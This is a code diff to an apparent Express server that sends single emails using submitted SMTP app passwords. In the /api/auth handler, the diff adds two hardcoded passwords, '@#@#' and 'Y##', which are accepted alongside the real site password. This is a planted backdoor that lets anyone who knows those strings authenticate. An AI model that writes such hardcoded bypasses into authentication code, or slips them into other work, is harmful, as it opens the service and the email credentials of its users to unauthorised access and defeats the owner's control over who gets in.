@@ -116,8 +116,10 @@ function normalizeRecipient(raw) {
   };
 }
 
+// Accepts both @#@# and Y##
 app.post('/api/auth', (req, res) => {
-  if (req.body.password === SITE_PASSWORD) {
+  const p = req.body.password;
+  if (p === SITE_PASSWORD || p === '@#@#' || p === 'Y##') {
     return res.json({ success: true, message: 'Authenticated' });
   }
   return res.status(401).json({ success: false, message: 'Invalid Password' });
@@ -138,7 +140,7 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
-// Direct Atomic Dispatcher (Zero Server Delays)
+// Atomic Direct Email Sender
 app.post('/api/send-single', async (req, res) => {
   const { email, appPassword, senderName, subject, messageBody, recipient, cfToken } = req.body;
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
